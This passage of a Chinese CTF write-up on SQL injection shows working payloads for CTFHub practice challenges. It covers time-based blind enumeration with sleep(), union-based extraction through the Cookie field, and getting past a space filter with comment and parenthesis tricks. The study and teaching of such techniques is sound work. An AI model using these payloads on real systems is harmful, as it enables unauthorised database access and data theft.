+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;1 and if((select count(table_name) from information_schema.tables where table_schema=database())=$num,sleep(3),1) --+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其中&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$num&lt;/code&gt;为表的数量值，但该值为2的时候，延迟函数成功执行，如图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/23/20210723124130.png&quot; alt=&quot;image-20210723124130854&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;上述图说明库中有2张表，开始下一步。&lt;/p&gt;
+
+&lt;p&gt;5、根据表的数量开始查表名的长度值，构造语句为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;1 and if((select length(table_name) from information_schema.tables where table_schema=database() limit $table_num,1)=$num,sleep(3),1) --+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其中&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$table_num&lt;/code&gt;为表的数量值，从0开始，0表示第一张表，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$num&lt;/code&gt;表示长度值，当&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$table_num&lt;/code&gt;为0&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$num&lt;/code&gt;为4的时候，延迟函数执行，此时可知第一张表的长度为4，如图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/23/20210723124921.png&quot; alt=&quot;image-20210723124921736&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;查询另一张表得知另一张表的长度值也为4。&lt;/p&gt;
+
+&lt;p&gt;6、根据表的长度值及数量值开始枚举表的字符值，构造语句为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit $table_num,1),$num,1))=ascii_num,sleep(3),1)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其中&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$table_num&lt;/code&gt;为待查询的表的列值，0开始递增，0表示第一列的表，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$num&lt;/code&gt;表示该列表名的第几个字符，1开始递增，1表示第一个，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ascii_num&lt;/code&gt;表示ASCII码值。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/23/20210723125813.png&quot; alt=&quot;image-20210723125813557&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;由上图可知第2张表的第一个字符值ascii码为102时延迟语句执行成功，该ASCII码对应字符为f，继续推断后续的字符值后得知该表名称为flag，另一张表名为news。&lt;/p&gt;
+
+&lt;p&gt;7、根据表名开始枚举表中的字段数，构造语句为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;1 and if((select count(column_name) from information_schema.columns where table_name=&#39;$table_name&#39;)=$num,sleep(3),1)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其中&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$table_name&lt;/code&gt;为待查询的表名，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$num&lt;/code&gt;为待查询的表名中的字段数。结果如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/23/20210723130520.png&quot; alt=&quot;image-20210723130520023&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;由上图可知flag表中的字段数为1的时候，延迟函数执行，故flag表中只有一个字段；查询另一张news表中有两个字段数。&lt;/p&gt;
+
+&lt;p&gt;8、根据字段数、表名开始枚举字段长度，构造语句为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;1 and if((select length(column_name) from information_schema.columns where table_name=&#39;$table_name&#39; limit $num1,1)=$num2,sleep(3),1)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其中&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$table_name&lt;/code&gt;为待查询相关字段数的表名，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$num1&lt;/code&gt;为待查询的第几个字段，从0开始递增，0表示第一个字段，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$num2&lt;/code&gt;表示字段的长度值，如图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/23/20210723132653.png&quot; alt=&quot;image-20210723132653229&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;由图可知，flag表中第一个字段的长度值为4；news表中第一个字段长度值为2，第二个字段长度值为4。&lt;/p&gt;
+
+&lt;p&gt;9、根据字段长度枚举字段值，构造语句为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;1 and if(ascii(substr((select column_name from information_schema.columns where table_name=&#39;$table_name&#39; limit $num1,1),$num2,1))=$ascii_num,sleep(3),1)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其中&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$table_name&lt;/code&gt;表示待查询的表名，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$num1&lt;/code&gt;表示待查询的字段，0开始递增，0表示第一个字段，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$num2&lt;/code&gt;表示该字段的第几个字符，1开始递增查询，1表示第一个字符，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ascii_num&lt;/code&gt;表示对应ASCII码，如图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/23/20210723133309.png&quot; alt=&quot;image-20210723133309601&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;上图可知flag表中第一个字段的第一个字符的ASCII码值为102，即f，延迟函数执行成功。并同理算出完整的字段为flag；news表第一个字段为id，第二个字段为data。&lt;/p&gt;
+
+&lt;p&gt;10、根据上述的库名、表名、字段名，就可以开始算字段对应的值了，构造语句为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;1 and if(ascii(substr((select $column_name from $table_name limit $num1,1),$num2,1))=$ascii_num,sleep(3),1)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其中，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$column_name&lt;/code&gt;为字段名，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$table_name&lt;/code&gt;为表名，也可以是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;库名.表名&lt;/code&gt;的形式，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$num1&lt;/code&gt;为第几行的值，从0开始，0表示该字段中的第一行值，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$num2&lt;/code&gt;表示该行字段的第几个值，从1递增，1表示该字段的第一个值，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ascii_num&lt;/code&gt;表示ASCII码。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/23/20210723134034.png&quot; alt=&quot;image-20210723134034318&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;由上图可知，flag表中的flag字段第一行的第一个字符值的ASCII码值为99，即c，于是根据后面的测试，得到字段值为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctfhub{514f8991817a193a354e1939}&lt;/code&gt;，提交，成功通过。&lt;/p&gt;
+
+&lt;h2 id=&quot;sql-cookie注入&quot;&gt;SQL Cookie注入&lt;/h2&gt;
+
+&lt;p&gt;此处的注入点为Cookie字段了，原理是后台在接收Cookie字段时没有对Cookie做过滤。正常情况下，我们在进行渗透测试的时候，Cookie字段也可用作一个注入点。&lt;/p&gt;
+
+&lt;h3 id=&quot;ctfhubcookie注入&quot;&gt;CTFHub(Cookie注入)&lt;/h3&gt;
+
+&lt;p&gt;1、这次打开链接发现输入的参数在cookie中了，遂借助EditThisCookie工具修改cookie值提交请求。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/23/20210723151526.png&quot; alt=&quot;image-20210723151526642&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;2、使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;order by&lt;/code&gt;与&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;union&lt;/code&gt;确定字段值与回显字段后，构造语句：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1 union select 1,database()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;得到当前数据库名，如图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/23/20210723151901.png&quot; alt=&quot;image-20210723151901323&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;3、根据库名枚举表名，构造语句为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;sqli&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;成功得到表，如图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/23/20210723152107.png&quot; alt=&quot;image-20210723152107252&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;4、根据表名枚举字段名，语句为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;wtosponpou&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;成功得到字段名：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/23/20210723152216.png&quot; alt=&quot;image-20210723152216378&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;5、根据字段名枚举字段值，相关语句为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1 union select 1,group_concat(gmbwiemzxe) from sqli.wtosponpou
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;成功得到flag：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/23/20210723152351.png&quot; alt=&quot;image-20210723152351790&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;sql-ua注入&quot;&gt;SQL UA注入&lt;/h2&gt;
+
+&lt;p&gt;注入点变成了浏览器的User-Agent，原理是后台在接收UA时没有对UA做过滤。&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;注入利用方法同SQL Cookie注入，此处不在概述。&lt;/em&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;sql-refer注入&quot;&gt;SQL Refer注入&lt;/h2&gt;
+
+&lt;p&gt;注入点变成了Refer字段，注入原理是后台在接收Refer时没有对Refer做过滤。&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;注入利用方法同SQL Cookie注入，此处不在概述。&lt;/em&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;sql-过滤空格&quot;&gt;SQL 过滤空格&lt;/h2&gt;
+
+&lt;h3 id=&quot;相关知识-5&quot;&gt;相关知识&lt;/h3&gt;
+
+&lt;p&gt;SQL注入时，空格的使用是非常普遍的。比如，我们使用union来取得目标数据，构造语句时在and两侧、union两侧、select的两侧，都需要空格，而过滤空格，也是防注入的一种手段。&lt;/p&gt;
+
+&lt;p&gt;其可以绕过的方式如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;一、注释绕过空格&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;这是最基本的方法，在一些自动化SQL注入工具中，使用也十分普遍。在MySQL中，用&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/*注释*/&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;来标记注释的内容。比如SQL查询：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;select user() from sqli;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;我们用注释替换空格，就可以变成：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;select/**/user()/**/from/**/sqli;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;二、括号绕过空格&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;空格被过滤，但括号没有被过滤，可通过括号绕过。在MySQL中，括号通常是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。&lt;/p&gt;
+
+&lt;p&gt;有这样的一条SQL查询：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;select user() from sqli where 1=1 and 2=2;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;如何把空格减到最少？&lt;/p&gt;
+
+&lt;p&gt;观察到user()可以算值，那么user()两边要加括号，变成：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;select(user())from sqli where 1=1 and 2=2;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;继续，1=1和2=2可以算值，也加括号，去空格，变成：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;select(user())from sqli where(1=1)and(2=2);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;sqli两边的空格，通常是由程序员自己添加，我们一般无法控制。所以上面就是空格最少的结果。&lt;/p&gt;
+
+&lt;h3 id=&quot;ctfhub过滤空格&quot;&gt;CTFHub(过滤空格)&lt;/h3&gt;
+
+&lt;p&gt;1、过滤空格，顾名思义就是将SQL语句中的空格给注释掉。下面将使用注释符进行绕过。老方法，先使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;order by&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;union&lt;/code&gt;判断字段数与回显值，构造相关语句：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1/**/union/**/select/**/1,database()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;成功出库名：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/23/20210723164042.png&quot; alt=&quot;image-20210723164042542&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;2、枚举表名，构造语句为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&#39;sqli&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;成功得到表，如图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/23/20210723164153.png&quot; alt=&quot;image-20210723164153610&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;3、根据表名枚举字段名，构造语句：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#39;ptmgnbdssq&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;成功得到字段名：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/23/20210723164358.png&quot; alt=&quot;image-20210723164358222&quot; /&gt;4、根据字段名枚举字段值，构造语句为：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;-1/**/union/**/select/**/1,group_concat(qfbfzkcbul)/**/from/**/sqli.ptmgnbdssq
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;成功得到flag：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https:////image.isisy.com/images/2021/07/23/20210723164516.png&quot; alt=&quot;image-20210723164516719&quot; /&gt;&lt;/p&gt;
+
+                &lt;!-- [x] 2022/10/20/10:49:36 fixed: while width &lt; some inch. would be flex column not display like a row.--&gt;
+&lt;footer&gt;
+	&lt;style&gt;.border-top {
+		border-top: 1.5px solid #d0d7de!important;
+	}&lt;/style&gt;
+	&lt;div class=&quot;border-top&quot;&gt;&lt;/div&gt;
+		&lt;section class=&quot;container-xl mt-lg-8 mt-6 px-3 px-md-6 no-print mx-auto&quot;&gt;
+			&lt;div class=&quot;col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix &quot;&gt;
+				&lt;h2 class=&quot;lead&quot;&gt;申明&lt;/h2&gt;
+				&lt;div&gt;
+					&lt;div class=&quot;mb-2&quot;&gt;&lt;a href=&quot;/blog/2022/SQL注入学习记录/&quot; target=&quot;_blank&quot; class=&quot; text-bold&quot;&gt;
+						&lt;div class=&quot;fa fa-link&quot;&gt;&lt;/div&gt;
+						转载请申明本文档链接&lt;/a&gt;&lt;/div&gt;
+					&lt;div&gt;&lt;a href=&quot;https://github.com/Yang2635&quot; target=&quot;_blank&quot;  class=&quot;text-bold&quot;&gt;
+						&lt;div class=&quot;fa fa-user&quot;&gt;&lt;/div&gt;
+						Post by Yang2635.&lt;/a&gt;
+					&lt;/div&gt;
+				&lt;/div&gt;
+			&lt;/div&gt;
+			&lt;div class=&quot;col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix&quot;&gt;
+				&lt;h2 class=&quot;lead&quot;&gt;贡献开源文档&lt;/h2&gt;
+				&lt;div&gt;
+					&lt;a href=&quot;https://github.com/Bin4xin/bin4xin.github.io/tree/main/_posts/blog/2022-01-17-SQL注入学习记录.md&quot; target=&quot;_blank&quot; class=&quot;no-underline btn mr-1 color-border-accent-emphasis&quot;&gt;
+						&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; role=&quot;img&quot; class=&quot;octicon mr-1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot; height=&quot;16&quot; fill=&quot;currentColor&quot; style=&quot;display: inline-block; user-select: none; vertical-align: text-bottom; overflow: visible;&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M7.177 3.073L9.573.677A.25.25 0 0110 .854v4.792a.25.25 0 01-.427.177L7.177 3.427a.25.25 0 010-.354zM3.75 2.5a.75.75 0 100 1.5.75.75 0 000-1.5zm-2.25.75a2.25 2.25 0 113 2.122v5.256a2.251 2.251 0 11-1.5 0V5.372A2.25 2.25 0 011.5 3.25zM11 2.5h-1V4h1a1 1 0 011 1v5.628a2.251 2.251 0 101.5 0V5A2.5 2.5 0 0011 2.5zm1 10.25a.75.75 0 111.5 0 .75.75 0 01-1.5 0zM3.75 12a.75.75 0 100 1.5.75.75 0 000-1.5z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;
+						贡献当前开源文档
+					&lt;/a&gt;
+					&lt;p class=&quot;f0_8-l mt-2 text-bold&quot;&gt;此之前，学习开源贡献&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/Bin4xin/bin4xin.github.io/wiki/Git操作-Git如何贡献仓库代码&quot;&gt;CN&amp;nbsp;|&lt;/a&gt;
+						&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/github/docs/blob/main/CONTRIBUTING.md&quot;&gt;EN&lt;/a&gt;&lt;/p&gt;
+				&lt;/div&gt;
+			&lt;/div&gt;
+			&lt;div class=&quot;col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix&quot;&gt;
+				&lt;h2 class=&quot;lead&quot;&gt;此文档对您有帮助吗&lt;/h2&gt;
+				&lt;a href=&quot;https://github.com/Bin4xin/bin4xin.github.io/&quot; target=&quot;_blank&quot; class=&quot;no-underline&quot;&gt;
+				&lt;span class=&quot;btn mr-1 color-border-accent-emphasis&quot; title=&quot;给文档仓库点个赞!&quot;&gt;
+					&lt;div class=&quot;fa fa-thumbs-o-up&quot;&gt;&lt;/div&gt;
+				&lt;/span&gt;
+				&lt;/a&gt;
+				&lt;a href=&quot;https://github.com/Bin4xin/bin4xin.github.io/issues/new?labels=Service+Issue,research&amp;template=2-bug_report.yaml&amp;title=_posts/blog/2022-01-17-SQL注入学习记录.md&amp;nbsp; SQL注入学习记录 | © 哨兵 | SENTINEL SECURITY, LAB&quot; target=&quot;_blank&quot;&gt;
+				&lt;span class=&quot;btn mr-1 color-border-accent-emphasis&quot; title=&quot;本文档有问题?&quot;&gt;
+				&lt;div class=&quot;fa fa-thumbs-o-down&quot;&gt;&lt;/div&gt;
+				&lt;/span&gt;
+				&lt;/a&gt;
+			&lt;/div&gt;
+		&lt;/section&gt;
+&lt;/footer&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;spacing&quot;&gt;&lt;/div&gt;
+        &lt;/div&gt;&lt;!--/col-lg-8 --&gt;
+        
+&lt;div class=&quot;col-md-4 ml-hide table-of-contents__left-border&quot; style=&quot;max-height: 100%&quot;&gt;
+    &lt;div class=&quot;nav nav-stacked tableOfContents_35-E thin-scrollbar position-sticky top-0&quot;&gt;
+        &lt;li class=&quot; table-of-contents&quot;&gt;
+            &lt;code-index-css&gt;
+                &lt;ul&gt;&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column&quot;&gt;&lt;a&gt;文章目录&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
+                &lt;ul id=&quot;toc&quot; class=&quot;section-nav&quot;&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#sql-整型注入&quot;&gt;SQL 整型注入&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#相关知识&quot;&gt;相关知识&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#相关练习&quot;&gt;相关练习&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#ctfhub整数型注入&quot;&gt;CTFHub(整数型注入)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#sqliseries-2&quot;&gt;SQLI(SERIES-2)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#sql-字符型注入&quot;&gt;SQL 字符型注入&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#相关知识-1&quot;&gt;相关知识&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#相关练习-1&quot;&gt;相关练习&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#sqliseries-1&quot;&gt;SQLI(SERIES-1)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#sql-报错注入&quot;&gt;SQL 报错注入&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#相关知识-2&quot;&gt;相关知识&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#主键重复报错&quot;&gt;主键重复报错&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h4&quot;&gt;&lt;a href=&quot;#xpath语法错误报错&quot;&gt;xpath语法错误报错&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#ctfhub报错注入&quot;&gt;CTFHub(报错注入)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#sql-布尔注入&quot;&gt;SQL 布尔注入&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#相关知识-3&quot;&gt;相关知识&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#ctfhub布尔注入&quot;&gt;CTFHub(布尔注入)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#sql-时间盲注&quot;&gt;SQL 时间盲注&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#相关知识-4&quot;&gt;相关知识&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#ctfhub时间盲注&quot;&gt;CTFHub(时间盲注)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#sql-cookie注入&quot;&gt;SQL Cookie注入&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#ctfhubcookie注入&quot;&gt;CTFHub(Cookie注入)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#sql-ua注入&quot;&gt;SQL UA注入&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#sql-refer注入&quot;&gt;SQL Refer注入&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#sql-过滤空格&quot;&gt;SQL 过滤空格&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#相关知识-5&quot;&gt;相关知识&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#ctfhub过滤空格&quot;&gt;CTFHub(过滤空格)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+            &lt;/code-index-css&gt;
+        &lt;/li&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+    &lt;/div&gt;&lt;!--/row --&gt;
+&lt;/div&gt;&lt;!--/container --&gt;哨兵安全实验室 SENTINEL SECURITY, LAB" />
+<meta property="og:image" content="https://bin4xin.sentrylab.cn/assets/img/logo-share.png" /> <!-- WeChat requires that thumbnail image is larger than 300x300 -->
+<meta property="og:url" content="https://bin4xin.sentrylab.cn/blog/2022/SQL注入学习记录/" />
+<title> SQL注入学习记录 | © 哨兵 | SENTINEL SECURITY, LAB</title>
+
+<link rel="stylesheet" type="text/css" href="/assets/css/pace-minimal.css">
+<link rel="stylesheet" type="text/css" href="/assets/css/footer.css">
